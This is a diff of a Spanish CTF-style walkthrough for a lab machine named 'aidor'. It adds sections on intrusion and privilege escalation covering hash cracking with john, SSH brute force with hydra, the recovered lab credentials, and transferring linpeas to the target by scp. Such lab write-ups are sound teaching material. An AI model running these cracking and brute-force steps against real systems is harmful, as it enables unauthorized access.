@@ -132,7 +132,10 @@ cat password.txt | hash-identifier
 
 ![Nmap Scan](images/aidor/aidor11.png)
 
-y veo que se trata de SHA-256, utilizo john para desencirptalos:
+
+## FASE DE INTRUSIÓN
+
+veo que se trata de SHA-256, utilizo john para desencirptalos:
 
 ```bash
 john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt 
@@ -157,6 +160,49 @@ hydra -L solo_usuarios.txt -P password_decode.txt -t 1 -W 5 -V ssh://172.17.0.2
 
 
 ![Nmap Scan](images/aidor/aidor13.png)
+
+
+
+Ya tenemos un user y un password:
+
+```bash
+aidor:chocolate
+```
+
+## ESCALADA DE PRIVILEGIOS
+
+Nos conectamos por ssh:
+
+```bash
+ssh aidor@172.17.0.2
+```
+
+![Nmap Scan](images/aidor/aidor14.png)
+
+
+Desde esta url bajamos linpeas:
+```bash
+https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+```
+
+
+![Nmap Scan](images/aidor/aidor15.png)
+
+miramos que metodos de transferencia tenemos
+
+
+![Nmap Scan](images/aidor/aidor16.png)
+
+
+disponemos de SCP, desde nuestra máquina vamos a transferir el archivo a la máquina victima:
+
+```bash
+scp linpeas.sh aidor@172.17.0.2:/tmp
+```
+
+
+![Nmap Scan](images/aidor/aidor16.png)
+
 
 
 
